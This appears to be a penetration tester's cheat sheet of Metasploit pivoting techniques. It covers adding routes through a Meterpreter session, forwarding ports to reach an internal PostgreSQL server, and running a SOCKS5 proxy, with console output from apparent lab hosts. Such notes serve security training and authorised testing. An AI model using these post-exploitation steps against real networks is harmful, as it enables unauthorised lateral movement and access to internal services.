# Metasploit Tunneling
## Routing Traffic
### Meterpreter

```
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use post/multi/manage/autoroute
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 172.16.1.23
[*] Searching for subnets to autoroute.
[+] Route added to subnet 172.16.1.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> 
```
- Create a route manually
- Deprecated, but still works (for now):
```
run autoroute -s 10.129.207.128/20
```
## Port Forwarding
### Meterpreter
Forward a port
```
portfwd add -l 5432 -p 5432 -r 10.129.207.128
```
```
portfwd add -l 5432 -p 5432 -r 127.0.0.1
```
```
(Meterpreter 1)(/home/bob/.mal) > portfwd add -l 5432 -p 5432 -r 127.0.0.1
[*] Forward TCP relay created: (local) :5432 -> (remote) 127.0.0.1:5432
(Meterpreter 1)(/home/bob/.mal) >
```
```
$ psql -U postgres -h 127.0.0.1 -p 5432
psql (15.10 (Debian 15.10-0+deb12u1), server 9.6.0)
Type "help" for help.

postgres=# 
```
## SOCKS Proxy
### Meterpreter
```
use auxiliary/server/socks_proxy
```
```
[msf](Jobs:0 Agents:1) post(multi/manage/autoroute) >> use auxiliary/server/socks_proxy
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set version 5
version => 5
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set srvport 9050
srvport => 9050
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> run
[*] Auxiliary module running as background job 0.
[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> 
[*] Starting the SOCKS proxy server

[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> 
```
